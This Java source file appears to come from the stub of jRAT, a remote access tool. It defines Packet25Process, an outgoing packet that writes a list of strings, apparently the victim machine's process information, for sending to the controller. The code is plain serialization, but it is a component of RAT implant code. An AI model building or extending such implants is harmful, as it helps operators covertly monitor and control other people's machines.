package se.jrat.stub.packets.outgoing;

import java.io.DataOutputStream;

import se.jrat.common.io.StringWriter;


public class Packet25Process extends AbstractOutgoingPacket {

	private String[] data;

	public Packet25Process(String[] data) {
		this.data = data;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		assert data.length <= Byte.MAX_VALUE;
		
		dos.writeByte(data.length);
		
		for (int i = 0; i < data.length; i++) {
			sw.writeLine(data[i]);
		}
	}

	@Override
	public byte getPacketId() {
		return 25;
	}

}
